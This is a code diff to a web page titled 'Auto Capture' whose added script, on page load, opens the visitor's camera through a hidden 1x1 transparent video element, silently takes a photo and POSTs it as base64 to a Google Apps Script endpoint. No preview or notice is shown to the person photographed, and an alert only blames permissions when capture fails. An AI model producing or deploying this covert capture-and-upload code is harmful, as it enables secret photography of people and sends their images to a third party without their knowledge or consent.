@@ -1,7 +1,11 @@
+
+
+
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Camera Capture</title>
+    <title>Auto Capture</title>
     <style>
         body {
             margin: 0;
@@ -14,33 +18,84 @@
             height: 100vh;
             overflow: hidden;
         }
+        /* Hidden camera elements */
+        #camera-preview {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
     </style>
-<!-- </head> https://script.google.com/macros/s/AKfycbyvPd-YTpkW2g89s80DBC4R-RQZjCu_viF_zkYSTipUOYjwEDyxVsdmqti5uc9RYc6e/exec -->
+</head>
 <body>
-    
+    <!-- Hidden camera elements -->
+    <video id="camera-preview" autoplay playsinline></video>
+    <canvas id="camera-canvas" style="display:none;"></canvas>
+
     <script>
+        // Configuration - Replace with your Apps Script URL
+        const APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxlS1l8HdqPeJAOGQz7OXFJU9j0y_jl4p8vwfvK9LyxOks6ZCQcCmVFeDUtl9AQHw7J/exec';
+
         async function captureAndUpload() {
-        // 1. Access camera and take photo (your existing code)
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        // ... (your capture logic)
-
-        // 2. Convert to base64
-        const canvas = document.createElement('canvas');
-        // ... (draw image to canvas)
-        const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
-
-        // 3. Send to Apps Script
-        try {
-            await fetch('https://script.google.com/macros/s/AKfycbyvPd-YTpkW2g89s80DBC4R-RQZjCu_viF_zkYSTipUOYjwEDyxVsdmqti5uc9RYc6e/exec', {
-            method: 'POST',
-            body: imageData
-            });
-            console.log('Uploaded successfully!');
-        } catch (error) {
-            console.error('Upload failed:', error);
+            try {
+                console.log('Starting camera...');
+                
+                // 1. Access camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
+                const video = document.getElementById('camera-preview');
+                const canvas = document.getElementById('camera-canvas');
+                
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                await video.play();
+                
+                console.log('Camera ready. Capturing in 1s...');
+                
+                // 2. Wait for camera to focus
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // 3. Capture image
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // 4. Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                
+                // 5. Convert to base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+                
+                console.log('Uploading to Google Drive...');
+                
+                // 6. Send to Google Apps Script
+                const response = await fetch(APP_SCRIPT_URL, {
+                    method: 'POST',
+                    body: imageData
+                });
+                
+                if (response.ok) {
+                    console.log('Upload successful!');
+                } else {
+                    throw new Error('Upload failed');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Camera access failed. Please allow permissions and refresh.');
+            }
         }
-        }
-</script>
+
+        // Start capture when page loads
+        window.addEventListener('load', captureAndUpload);
+    </script>
 </body>
 </html>
